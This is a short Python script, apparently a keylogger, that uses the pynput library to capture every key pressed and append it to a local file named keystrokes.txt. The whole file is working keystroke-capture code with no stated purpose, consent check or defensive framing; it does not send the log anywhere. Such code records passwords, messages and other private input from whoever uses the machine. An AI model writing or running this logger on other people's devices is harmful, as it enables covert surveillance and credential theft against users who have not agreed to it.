from pynput.keyboard import Listener

Log_File = "keystrokes.txt"

def on_press(key):
    with open(Log_File,"a") as file:
        file.write(f"{key}")

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

start_keylogger()